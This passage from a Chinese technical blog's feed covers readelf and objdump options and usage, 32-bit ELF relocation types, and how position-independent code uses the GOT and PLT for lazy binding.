class="line">  -p --string-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as strings</span><br><span class="line">  -R --relocated-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as relocated bytes</span><br><span class="line">  -w[lLiaprmfFsoRt] or</span><br><span class="line">  --debug-dump[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,</span><br><span class="line">               =frames-interp,=str,=loc,=Ranges,=pubtypes,</span><br><span class="line">               =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,</span><br><span class="line">               =addr,=cu_index]</span><br><span class="line">                         Display the contents of DWARF2 debug sections</span><br><span class="line">  --dwarf-depth=N        Do not display DIEs at depth N or greater</span><br><span class="line">  --dwarf-start=N        Display DIEs starting with N, at the same depth</span><br><span class="line">                         or deeper</span><br><span class="line">  -I --histogram         Display histogram of bucket list lengths</span><br><span class="line">  -W --wide              Allow output width to exceed 80 characters</span><br><span class="line">  @&lt;file&gt;                Read options from &lt;file&gt;</span><br><span class="line">  -H --help              Display this information</span><br><span class="line">  -v --version           Display the version number of readelf</span><br></pre></td></tr></table></figure><h2 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">objdump [-a|--archive-headers]</span><br><span class="line">   [-b bfdname|--target=bfdname]</span><br><span class="line">   [-C|--demangle[=style] ]</span><br><span class="line">   [-d|--disassemble]</span><br><span class="line">   [-D|--disassemble-all]</span><br><span class="line">   [-z|--disassemble-zeroes]</span><br><span class="line">   [-EB|-EL|--endian=&#123;big | little &#125;]</span><br><span class="line">   [-f|--file-headers]</span><br><span class="line">   [-F|--file-offsets]</span><br><span class="line">   [--file-start-context]</span><br><span class="line">   [-g|--debugging]</span><br><span class="line">   [-e|--debugging-tags]</span><br><span class="line">   [-h|--section-headers|--headers]</span><br><span class="line">   [-i|--info]</span><br><span class="line">   [-j section|--section=section]</span><br><span class="line">   [-l|--line-numbers]</span><br><span class="line">   [-S|--source]</span><br><span class="line">   [-m machine|--architecture=machine]</span><br><span class="line">   [-M options|--disassembler-options=options]</span><br><span class="line">   [-p|--private-headers]</span><br><span class="line">   [-P options|--private=options]</span><br><span class="line">   [-r|--reloc]</span><br><span class="line">   [-R|--dynamic-reloc]</span><br><span class="line">   [-s|--full-contents]</span><br><span class="line">   [-W[lLiaprmfFsoRt]|</span><br><span class="line">    --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames]</span><br><span class="line">            [=aranges,=macro,=frames,=frames-interp,=str,=loc]</span><br><span class="line">            [=Ranges,=pubtypes,=trace_info,=trace_abbrev]</span><br><span class="line">            [=trace_aranges,=gdb_index]</span><br><span class="line">   [-G|--stabs]</span><br><span class="line">   [-t|--syms]</span><br><span class="line">   [-T|--dynamic-syms]</span><br><span class="line">   [-x|--all-headers]</span><br><span class="line">   [-w|--wide]</span><br><span class="line">   [--start-address=address]</span><br><span class="line">   [--stop-address=address]</span><br><span class="line">   [--prefix-addresses]</span><br><span class="line">   [--[no-]show-raw-insn]</span><br><span class="line">   [--adjust-vma=offset]</span><br><span class="line">   [--special-syms]</span><br><span class="line">   [--prefix=prefix]</span><br><span class="line">   [--prefix-strip=level]</span><br><span class="line">   [--insn-width=width]</span><br><span class="line">   [-V|--version]</span><br><span class="line">   [-H|--help]</span><br><span class="line">   objfile...</span><br></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"># https://wangchujiang.com/linux-command/c/objdump.html</span><br><span class="line"></span><br><span class="line"><span class="deletion">-a --archive-headers </span></span><br><span class="line"># 显示档案库的成员信息,类似ls -l将lib*.a的信息列出。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-b bfdname --target=bfdname </span></span><br><span class="line"># 指定目标码格式。这不是必须的，objdump能自动识别许多格式，比如： </span><br><span class="line"></span><br><span class="line">objdump -b oasys -m vax -h fu.o </span><br><span class="line"># 显示fu.o的头部摘要信息，明确指出该文件是Vax系统下用Oasys编译器生成的目标文件。objdump -i将给出这里可以指定的目标码格式列表。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-C --demangle </span></span><br><span class="line"># 将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外，还使得C++函数名以可理解的方式显示出来。 </span><br><span class="line"><span class="deletion">--debugging </span></span><br><span class="line"><span class="deletion">-g </span></span><br><span class="line"># 显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。仅仅支持某些类型的调试信息。有些其他的格式被readelf -w支持。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-e --debugging-tags </span></span><br><span class="line"># 类似-g选项，但是生成的信息是和ctags工具相兼容的格式。 </span><br><span class="line"><span class="deletion">--disassemble </span></span><br><span class="line"><span class="deletion">-d </span></span><br><span class="line"># 从objfile中反汇编那些特定指令机器码的section。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-D --disassemble-all </span></span><br><span class="line"># 与 -d 类似，但反汇编所有section. </span><br><span class="line"></span><br><span class="line"><span class="deletion">--prefix-addresses </span></span><br><span class="line"># 反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-EB </span></span><br><span class="line"><span class="deletion">-EL </span></span><br><span class="line"><span class="deletion">--endian=&#123;big|little&#125; </span></span><br><span class="line"># 指定目标文件的小端。这个项将影响反汇编出来的指令。在反汇编的文件没描述小端信息的时候用。例如S-records. </span><br><span class="line"></span><br><span class="line"><span class="deletion">-f </span></span><br><span class="line"><span class="deletion">--file-headers </span></span><br><span class="line">显示objfile中每个文件的整体头部摘要信息。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-h </span></span><br><span class="line"><span class="deletion">--section-headers </span></span><br><span class="line"><span class="deletion">--headers </span></span><br><span class="line">显示目标文件各个section的头部摘要信息。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-H </span></span><br><span class="line"><span class="deletion">--help </span></span><br><span class="line">简短的帮助信息。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-i </span></span><br><span class="line"><span class="deletion">--info </span></span><br><span class="line">显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-j name</span></span><br><span class="line"><span class="deletion">--section=name </span></span><br><span class="line">仅仅显示指定名称为name的section的信息 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-l</span></span><br><span class="line"><span class="deletion">--line-numbers </span></span><br><span class="line">用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用使用-ld和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-m machine </span></span><br><span class="line"><span class="deletion">--architecture=machine </span></span><br><span class="line">指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如S-records)，这个选项很有用。可以用-i选项列出这里能够指定的架构. </span><br><span class="line"></span><br><span class="line"><span class="deletion">--reloc </span></span><br><span class="line"><span class="deletion">-r </span></span><br><span class="line">显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--dynamic-reloc </span></span><br><span class="line"><span class="deletion">-R </span></span><br><span class="line">显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-s </span></span><br><span class="line"><span class="deletion">--full-contents </span></span><br><span class="line">显示指定section的完整内容。默认所有的非空section都会被显示。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-S </span></span><br><span class="line"><span class="deletion">--source </span></span><br><span class="line">尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--show-raw-insn </span></span><br><span class="line">反汇编的时候，显示每条汇编指令对应的机器码，如不指定--prefix-addresses，这将是缺省选项。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--no-show-raw-insn </span></span><br><span class="line">反汇编时，不显示汇编指令的机器码，如不指定--prefix-addresses，这将是缺省选项。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--start-address=address </span></span><br><span class="line">从指定地址开始显示数据，该选项影响-d、-r和-s选项的输出。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--stop-address=address </span></span><br><span class="line">显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-t </span></span><br><span class="line"><span class="deletion">--syms </span></span><br><span class="line">显示文件的符号表入口。类似于nm -s提供的信息 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-T </span></span><br><span class="line"><span class="deletion">--dynamic-syms </span></span><br><span class="line">显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D|--dynamic 显示的信息。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-V </span></span><br><span class="line"><span class="deletion">--version </span></span><br><span class="line">版本信息 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--all-headers </span></span><br><span class="line"><span class="deletion">-x </span></span><br><span class="line">显示所可用的头信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-z </span></span><br><span class="line"><span class="deletion">--disassemble-zeroes </span></span><br><span class="line">一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 </span><br><span class="line"></span><br><span class="line">@file 可以将选项集中到一个文件中，然后使用这个@file选项载入。</span><br></pre></td></tr></table></figure><h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><h2 id="应用程序的可运行的架构平台"><a href="#应用程序的可运行的架构平台" class="headerlink" title="应用程序的可运行的架构平台"></a>应用程序的可运行的架构平台</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -h main<span class="string">| grep Machine</span></span><br></pre></td></tr></table></figure><p>-h选项将显示文件头的概要信息，从里面可以看到，有很多有用的信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">readelf</span> <span class="string">-h</span> <span class="string">main</span></span><br><span class="line"><span class="attr">ELF Header:</span></span><br><span class="line"><span class="attr">Magic:</span>   <span class="string">7f</span> <span class="number">45</span> <span class="string">4c</span> <span class="number">46</span> <span class="number">02</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attr">Class:</span>                             <span class="string">ELF64</span></span><br><span class="line"><span class="attr">Data:</span>                              <span class="number">2</span> <span class="string">s</span> <span class="string">complement,</span> <span class="string">little</span> <span class="string">endian</span></span><br><span class="line"><span class="attr">Version:</span>                           <span class="number">1</span> <span class="string">(current)</span></span><br><span class="line"><span class="attr">OS/ABI:</span>                            <span class="string">UNIX</span> <span class="bullet">-</span> <span class="string">System</span> <span class="string">V</span></span><br><span class="line"><span class="attr">ABI Version:</span>                       <span class="number">0</span></span><br><span class="line"><span class="attr">Type:</span>                              <span class="string">EXEC</span> <span class="string">(Executable</span> <span class="string">file)</span></span><br><span class="line"><span class="attr">Machine:</span>                           <span class="string">Advanced</span> <span class="string">Micro</span> <span class="string">Devices</span> <span class="string">X86-64</span></span><br><span class="line"><span class="attr">Version:</span>                           <span class="number">0x1</span></span><br><span class="line"><span class="attr">Entry point address:</span>               <span class="number">0x400790</span></span><br><span class="line"><span class="attr">Start of program headers:</span>          <span class="number">64</span> <span class="string">(bytes</span> <span class="string">into</span> <span class="string">file)</span></span><br><span class="line"><span class="attr">Start of section headers:</span>          <span class="number">5224</span> <span class="string">(bytes</span> <span class="string">into</span> <span class="string">file)</span></span><br><span class="line"><span class="attr">Flags:</span>                             <span class="number">0x0</span></span><br><span class="line"><span class="attr">Size of this header:</span>               <span class="number">64</span> <span class="string">(bytes)</span></span><br><span class="line"><span class="attr">Size of program headers:</span>           <span class="number">56</span> <span class="string">(bytes)</span></span><br><span class="line"><span class="attr">Number of program headers:</span>         <span class="number">8</span></span><br><span class="line"><span class="attr">Size of section headers:</span>           <span class="number">64</span> <span class="string">(bytes)</span></span><br><span class="line"><span class="attr">Number of section headers:</span>         <span class="number">29</span></span><br><span class="line"><span class="attr">Section header string table index:</span> <span class="number">26</span></span><br></pre></td></tr></table></figure><h2 id="编译时是否使用了-g选项（加入调试信息）"><a href="#编译时是否使用了-g选项（加入调试信息）" class="headerlink" title="编译时是否使用了-g选项（加入调试信息）"></a>编译时是否使用了-g选项（加入调试信息）</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S main | <span class="keyword">grep</span> <span class="keyword">debug</span></span><br><span class="line">$ readelf -S main.<span class="keyword">o</span> | <span class="keyword">grep</span> <span class="keyword">debug</span></span><br></pre></td></tr></table></figure><p>用-S选项是显示所有段信息；如果编译时使用了-g选项，则会有debug段。</p><h2 id="查看本机目标结构（使用大端还是小端存储）"><a href="#查看本机目标结构（使用大端还是小端存储）" class="headerlink" title="查看本机目标结构（使用大端还是小端存储）"></a>查看本机目标结构（使用大端还是小端存储）</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>objdump -i</span><br></pre></td></tr></table></figure><h2 id="显示符号表入口"><a href="#显示符号表入口" class="headerlink" title="显示符号表入口"></a>显示符号表入口</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>objdump  -t main.o</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;整理linux中readelf、objdump工具的用法。&lt;/p&gt;</summary>
    
    
    
    <category term="linux" scheme="https://www.fvolcano.red/categories/linux/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>重定位类型介绍</title>
    <link href="https://www.fvolcano.red/2021/different-types-of-relocating/"/>
    <id>https://www.fvolcano.red/2021/different-types-of-relocating/</id>
    <published>2021-05-30T13:30:42.000Z</published>
    <updated>2021-05-30T13:30:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>整理32位elf格式中常见的重定位类型的含义与用法。</p><a id="more"></a><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><p><a href="https://bbs.pediy.com/thread-246373.htm">32位elf格式中的10种重定位类型</a></p></li><li><p><a href="http://www.360doc.com/content/17/1204/19/7377734_709898612.shtml">通过elf各种重定位类型，理解不同场合的链接过程</a></p></li><li><p><a href="https://docs.oracle.com/cd/E19253-01/819-7050/chapter6-26/index.html">表格整理</a></p></li></ol><p><strong>提出的所有内存地址都是在链接好的可执行文件中的已分配地址，如addr(.text)</strong></p><h1 id="R-386-32"><a href="#R-386-32" class="headerlink" title="R_386_32"></a>R_386_32</h1><p>公式：S+A</p><p>S：重定项中VALUE成员所指符号的内存地址</p><p>A：被重定位处原值，表示”引用符号的内存地址”与S的偏移</p><h1 id="R-386-RELATIVE"><a href="#R-386-RELATIVE" class="headerlink" title="R_386_RELATIVE"></a>R_386_RELATIVE</h1><p>公式：B+A</p><p>B：.so文件加载到内存中的基地址</p><p>A：被重定位处原值，表示引用符号在.so文件中的偏移</p><p><img src="/2021/different-types-of-relocating/v2-f78215bd90ddb90847d2253c2b6a12c5_r.jpg" alt="img"></p><h1 id="R-386-PC32"><a href="#R-386-PC32" class="headerlink" title="R_386_PC32"></a>R_386_PC32</h1><p>公式：S+A-P</p><p>S：重定项中VALUE成员所指符号的内存地址</p><p>A：被重定位处原值，表示”被重定位处”与”下一条指令”的偏移</p><p>P：被重定位处的内存地址</p><h1 id="R-386-GOTPC"><a href="#R-386-GOTPC" class="headerlink" title="R_386_GOTPC"></a>R_386_GOTPC</h1><p>公式：GOT+A-P</p><p>GOT：运行时，.got段的结束地址</p><p>A：被重定位处原值，表示”被重定位处”在机器码中的偏移</p><p>P：被重定位处的内存地址</p><h1 id="R-386-GOT32"><a href="#R-386-GOT32" class="headerlink" title="R_386_GOT32"></a>R_386_GOT32</h1><p>公式：G</p><p>G：引用符号的地址指针，相对于GOT的偏移</p><h1 id="R-386-GOLB-DAT"><a href="#R-386-GOLB-DAT" class="headerlink" title="R_386_GOLB_DAT"></a>R_386_GOLB_DAT</h1><p>公式：S</p><p>S：重定项中VALUE成员所指符号的内存地址</p><p><img src="/2021/different-types-of-relocating/v2-376d67a7ee2bb4099394606848a7de08_r.jpg" alt="img"></p><h1 id="R-386-GOTOFF"><a href="#R-386-GOTOFF" class="headerlink" title="R_386_GOTOFF"></a>R_386_GOTOFF</h1><p>公式：S-GOT </p><p>S：重定项中VALUE成员所指符号的内存地址 </p><p>GOT：运行时，.got段的结束地址</p><h1 id="R-386-PLT32"><a href="#R-386-PLT32" class="headerlink" title="R_386_PLT32"></a>R_386_PLT32</h1><p>公式：L+A-P</p><p>L：&lt;重定项中VALUE成员所指符号@plt&gt;的内存地址</p><p>A：被重定位处原值，表示”被重定位处”相对于”下一条指令”的偏移</p><p>P：被重定位处的内存地址</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;整理32位elf格式中常见的重定位类型的含义与用法。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机系统" scheme="https://www.fvolcano.red/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>PIC（位置无关代码）的实现</title>
    <link href="https://www.fvolcano.red/2021/why-we-need-PIC/"/>
    <id>https://www.fvolcano.red/2021/why-we-need-PIC/</id>
    <published>2021-05-30T13:27:52.000Z</published>
    <updated>2021-05-30T13:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>In <a href="https://www.wikiwand.com/en/Computing">computing</a>, <strong>position-independent code</strong> (<strong>PIC</strong>) or <strong>position-independent executable</strong> (<strong>PIE</strong>) is a body of <a href="https://www.wikiwand.com/en/Machine_code">machine code</a> that, being placed somewhere in the <a href="https://www.wikiwand.com/en/Primary_memory">primary memory</a>, executes properly regardless of its <a href="https://www.wikiwand.com/en/Absolute_address">absolute address</a>.<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.wikiwand.com/en/Position-independent_code">Position-independent code-wiki</a></li><li><a href="https://sa.sogou.com/sgsearch/sgs_tc_news.php?req=XJfILdCUU2TuOxZDyaoqZBTGiGQumUZMYP-S-WEG-a0=&user_type=1">深入理解 Linux 位置无关代码 PIC</a></li><li><a href="https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries">Position Independent Code (PIC) in shared libraries</a></li><li><a href="https://juejin.cn/post/6844903609558106125">稍微了解地址无关代码(Position-Independent Code)</a></li><li><a href="https://www.anquanke.com/post/id/197214">浅谈位置无关代码</a></li><li><a href="https://dirtysalt.github.io/html/pic-code.html">《深入理解计算机系统》- PIC(位置无关代码)</a></li><li><a href="https://www.icourse163.org/course/NJU-1001625001">MOOC-计算机系统基础(一)：程序的表示、转换与链接</a></li><li><a href="https://www.cnblogs.com/Przz/p/6505917.html">深入理解-位置无关代码</a></li></ol><p>没有开启地址随机化(ASLR - Address Space Layout Randomization)时，系统不会随机化分配程序的虚拟地址空间，程序所有的地址都是按照固定的规则来生成。通过objdump命令反汇编后可以看到，对于全局变量和函数调用的访问，汇编指令跟的地址都是固定的，这样的代码我们就称它为位置相关的。</p><p>固定地址的方式虽然简单，但是无法实现一些高级特性比如动态库支持。动态库的代码会通过mmap()系统调用来映射到进程的虚拟地址空间，不同的进程中，同一个动态库映射的虚拟地址是不确定的。如果动态库的实现上使用位置相关的代码，则无法达到其任意地址运行的目的，这种情况下我们就需要引入位置无关代码PIC的概念了。</p><p><img src="/2021/why-we-need-PIC/t01b5c7da6c4d3168d7.png" alt="img"></p><p>PIC，全称Position Independent Code。位置无关代码是指代码无论被加载到哪个地址上都可以正常执行。gcc选项中添加-fPIC会产生相关代码。</p><p>PIC的做法是让指令部分做到地址无关，所以可以让所有进程共享一份。但是数据部分并不地址无关，而是让所有进程在地址空间中都产生一份副本。</p><p>所以目标就是就是实现指令部分的无关，而指令中可能会包含对内部和外部的函数调用，以及内部和外部的数据访问，所以这样的划分就需要考虑四种情况。</p><h2 id="PIC的实现"><a href="#PIC的实现" class="headerlink" title="PIC的实现"></a>PIC的实现</h2><p>已知：当链接器将各个目标文件的所有section组合到一起的时候，链接器完全知道每个section的大小和它们之间的相对位置。因此可以计算出在.TEXT段内任意一条指令相对于.DATA段起始地址的相对偏移量。</p><h3 id="引用模块内数据"><a href="#引用模块内数据" class="headerlink" title="引用模块内数据"></a>引用模块内数据</h3><p>由“已知”可得，如果知道了当前指令的地址，那么就可以计算出数据段的地址。X86平台上没有获取当前指令指针寄存器IP的值的指令（X64上可以直接访问RIP），但可以通过一个小技巧来获取：</p><p><img src="/2021/why-we-need-PIC/image-20210531201257771.png" alt="image-20210531201257771"></p><p>这段代码在实际运行时，会有以下的事情发生：</p><ul><li>当cpu执行 call STUB的时候，会将下一条指令的地址（即IP中的值）保存到stack上，然后跳到标签STUB处执行。</li><li>STUB处的指令是pop ebx,这样就将 “pop ebx”这条指令所在的地址从stack弹出放到了ebx寄存器中，这样就得到了IP寄存器的值。</li></ul><p>在知道了当前的绝对地址后，根据已知的偏移量就可以得到数据段中某个变量的地址。</p><h3 id="引用模块内函数"><a href="#引用模块内函数" class="headerlink" title="引用模块内函数"></a>引用模块内函数</h3><h4 id="static-函数"><a href="#static-函数" class="headerlink" title="static 函数"></a>static 函数</h4><p>对这种函数的访问是最容易解决的问题，因为一个动态库在编译成一个模块之后，其中的指令之间的相对位置是固定的，所以通过一个相对跳转指令即可访问。</p><p><img src="/2021/why-we-need-PIC/1638d8862a2ef255" alt="img"></p><h4 id="全局函数"><a href="#全局函数" class="headerlink" title="全局函数"></a>全局函数</h4><p>因为为全局函数，所以要考虑一个叫做全局符号介入的问题，什么是全局符号介入呢？</p><p>在Linux下，当动态链接器加载一个模块时，需要将这个模块的符号加入到全局符号表中，如果某个要加入的符号名已经存在时，也就是此时重复了，这时候会忽略这次的添加操作，以第一次决议的符号为准，未来运行期间访问到这个符号的所有指令，都会使用第一次决议的符号，这时候情况和下面的外部函数情况相同。</p><h3 id="引用模块外数据"><a href="#引用模块外数据" class="headerlink" title="引用模块外数据"></a>引用模块外数据</h3><p>对于外部数据的访问，是通过全局偏移表global offset table（GOT）来实现的。</p><p>GOT是一张在data section中保存的一张表，里面记录了很多地址字段 (entry)。假设一条指令想要引用一个变量，并不是直接去用绝对地址，而是去引用GOT里的一个entry。GOT表在data section中的地址是明确的，GOT的entry包含了变量的绝对地址。</p><p><img src="/2021/why-we-need-PIC/image-20210531201310221-1622463190990.png" alt="image-20210531201310221"></p><p>但是还有一个问题，这个GOT表里存储的entry值又是怎么变成实际的绝对地址的呢？</p><p>动态加载器会解析rel.dyn段，当它看到重定向类型为R_386_GLOB_DAT的时候，会将符号var实际的地址值替换到记录的偏移处。</p><h3 id="引用模块外函数"><a href="#引用模块外函数" class="headerlink" title="引用模块外函数"></a>引用模块外函数</h3><p>与数据不同，因为有新特性：延迟绑定。</p><p>对于动态库的函数来说，在没有加载到程序的地址空间前，函数的实际地址都是未知的，动态加载器会处理这些问题，解析出实际地址的过程,这个过程称之为绑定。绑定的动作会消耗一些时间，因为加载器要通过特殊的查表、替换操作。</p><p>如果动态库有成百上千个函数接口，而实际的进程只用到了其中的几十个接口，如果全部都在加载的时候进行绑定操作，没有意义并且非常耗时。因此提出了延迟绑定的概念，程序只有在使用到对应接口时才实时地绑定接口地址。</p><p>为了实现延迟绑定，就额外增加了一个间接表PLT（过程链接表）。</p><p>PLT搭配GOT实现延迟绑定的过程如下：</p><p><img src="/2021/why-we-need-PIC/image-20210531201757402.png" alt="image-20210531201757402"></p><p>首先跳到PLT表对应函数地址PLT[n],然后取出GOT中对应的entry。GOT[n]里保存了实际要跳转的函数的地址，首次执行时此值为PLT[n]的prepare resolver的地址，这里准备了要解析的函数的相关参数，然后到PLT[0]处调用resolver进行解析。</p><p>resolver函数会做几件事情：</p><p>（1）解析出代码想要调用的func函数的实际地址A</p><p>（2）用实际地址A覆盖GOT[n]保存的plt_resolve_addr的值</p><p>（3）调用func函数</p><p>在之后的函数调用中，就不需要再走resolver过程了：</p><p><img src="/2021/why-we-need-PIC/image-20210531201922015.png" alt="image-20210531201922015"></p>]]></content>
    
    
